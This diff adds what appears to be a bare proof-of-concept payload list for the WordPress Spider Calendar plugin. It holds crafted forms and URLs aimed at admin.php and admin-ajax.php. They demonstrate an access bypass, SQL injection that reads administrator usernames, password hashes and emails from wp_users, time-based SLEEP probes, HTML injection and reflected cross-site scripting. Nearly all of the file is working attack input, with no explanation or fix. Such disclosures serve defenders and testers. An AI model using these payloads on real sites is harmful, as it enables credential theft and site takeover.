@@ -1,0 +1,55 @@
+Security-bypass:
+==========
+&lt;html&gt;&lt;body&gt;&lt;center&gt;
+&lt;form action=&quot;http://www.example.com/wp351/wp-admin/admin-ajax.php?action=spidercalendarinlineedit&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;calendar_id&quot; value=&quot;1&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Test&quot;&gt; &lt;/form&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+
+SQL-injection:
+============
+&lt;html&gt;&lt;body&gt;&lt;center&gt;
+&lt;form action=&quot;http://www.example.com/wp351/wp-admin/admin-ajax.php?action=spidercalendarinlineedit&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;calendar_id&quot; value=&quot;0 UNION SELECT 1,(SELECT CONCAT_WS(0x3a,user_login,user_pass,user_email)FROM wp_users WHERE ID=1),3,4,5,6,7&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Test&quot;&gt; &lt;/form&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+
+&lt;html&gt;&lt;body&gt;&lt;center&gt;
+&lt;form action=&quot;http://www.example.com/wp351/wp-admin/admin.php?page=SpiderCalendar&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;page_number&quot; value=&quot;1&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;asc_or_desc&quot; value=&quot;1&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;order_by&quot; value=&quot;IF(1=1,1,(SELECT 1 UNION SELECT 2))&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Test&quot;&gt; &lt;/form&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+
+http://www.example.com/wp351/wp-admin/admin.php?page=SpiderCalendar&amp;task=show_manage_event&amp;calendar_id=0+UNION+SELECT+1,2,3,4,(SELECT+CONCAT_WS(0x3a,user_login,user_pass,user_email)FROM+wp_users+WHERE+ID=1),6,7,8,9,10,11,12,13,14,15,16,17
+
+http://www.example.com/wp351/wp-admin/admin.php?page=SpiderCalendar&amp;task=published&amp;id=IF(1=1,1,SLEEP(10))
+
+http://www.example.com/wp351/wp-admin/admin.php?page=SpiderCalendar&amp;task=published&amp;id=IF(1=2,1,SLEEP(10))
+
+http://www.example.com/wp351/wp-admin/admin.php?page=SpiderCalendar&amp;task=add_event&amp;calendar_id=0+UNION+SELECT+@@version
+
+http://www.example.com/wp351/wp-admin/admin.php?page=SpiderCalendar&amp;task=edit_event&amp;id=1&amp;calendar_id=0+UNION+SELECT+@@version
+
+http://www.example.com/wp351/wp-admin/admin.php?page=SpiderCalendar&amp;task=published_event&amp;id=IF(1=1,1,SLEEP(10))
+
+http://www.example.com/wp351/wp-admin/admin.php?page=SpiderCalendar&amp;task=published_event&amp;id=IF(1=2,1,SLEEP(10))
+
+
+
+HTML-Injection:
+============
+
+http://www.example.com/wp351/wp-admin/admin.php?page=SpiderCalendar&amp;id=2
+
+http://www.example.com/wp351/wp-admin/admin.php?page=SpiderCalendar&amp;task=show_manage_event&amp;calendar_id=1
+
+
+Cross-site-scripting:
+==============
+
+&lt;html&gt;&lt;body&gt;&lt;center&gt;
+&lt;form action=&quot;http://www.example.com/wp351/wp-admin/admin.php?page=SpiderCalendar&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;page_number&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;serch_or_not&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(456);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Test&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+
+http://www.example.com/wp351/wp-admin/admin-ajax.php?action=spiderbigcalendarrr&amp;theme_id=&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;
+
+http://www.example.com/wp351/wp-admin/admin-ajax.php?action=spiderbigcalendarrr&amp;calendar_id=&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;
+
+http://www.example.com/wp351/wp-admin/admin-ajax.php?action=spiderbigcalendarrr&amp;ev_ids=&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;
+
+http://www.example.com/wp351/wp-admin/admin-ajax.php?action=spiderbigcalendarrr&amp;eventID=&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;
+
